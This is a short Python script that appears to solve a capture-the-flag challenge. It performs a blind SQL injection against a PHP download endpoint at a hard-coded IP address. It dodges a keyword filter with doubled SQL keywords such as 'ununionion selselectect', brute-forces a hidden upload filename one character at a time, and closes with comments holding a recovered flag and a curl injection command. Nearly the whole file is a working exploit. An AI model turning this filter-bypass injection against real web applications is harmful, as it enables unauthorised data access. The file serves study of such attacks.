#!/usr/bin/python
# coding:utf-8
import requests
import sys

url = "http://106.39.10.134:10003/downfile.php"


def getFilename():
    data = "image=100 aandnd image_name lilikeke 0x6368616d6435 ununionion selselectect 0x{filename} oorrder by 1#"
    data = data.replace(" ", "%20")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "PHPSESSID=vvv",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
    }
    randStr = "0123456789abcdefghijklmnopqrstuvwxyz{"
    fileName = "./Up10aDs/"
    for _ in range(33):
        # print(_)
        for pos in range(len(randStr)):
            tmpName = fileName + randStr[pos]
            tmpData = data.format(filename=tmpName.encode("hex"))
            sys.stdout.write("\t-> " + randStr[pos] + "\r")
            sys.stdout.flush()
            res = requests.post(url, data=tmpData, headers=headers)
            if "deleted" not in res.content:
                fileName = fileName + randStr[pos - 1]
                print "[*]", fileName
                print
                break
        # if len(fileName) == (len(tmpName)):
        #     print "[!] Error"
        #     break
        # else:
        #     print(res.content)
        # if fileName == tmpName[:-1]:
        #     print "[!] Error"
        #     break
if __name__ == '__main__':
    getFilename()
    # whaleCTF{yuqbeqlf8923hjdkjfdkjsa}
    # curl http://106.39.10.134:10003/downfile.php -H "Cookie: PHPSESSID=vvv"
    # --output - -d "image=999 uniunionon selselectect
    # 0x46314167497348337233473030642e706870#"
